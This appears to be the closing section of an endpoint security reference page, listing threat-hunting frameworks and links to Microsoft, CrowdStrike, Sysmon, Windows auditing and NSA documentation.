### Threat Hunting Frameworks

- **TaHiTI**: Threat-Hunting methodology
- **PEAK**: Prepare, Execute, Act with Knowledge hunting framework
- **SANS Hunting Maturity Model**: Levels 0-4, structured maturity assessment

### Key References

- Microsoft MDE documentation: `docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/`
- CrowdStrike API docs: `falcon.crowdstrike.com/documentation/`
- Sysmon documentation: `docs.microsoft.com/en-us/sysinternals/downloads/sysmon`
- Windows Security Audit Events: `docs.microsoft.com/en-us/windows/security/threat-protection/auditing/`
- NSA Endpoint Security guidance: `media.defense.gov`

---

*Last updated: 2026-04-24 | Category: Endpoint Security | Framework: MITRE ATT&CK v15*
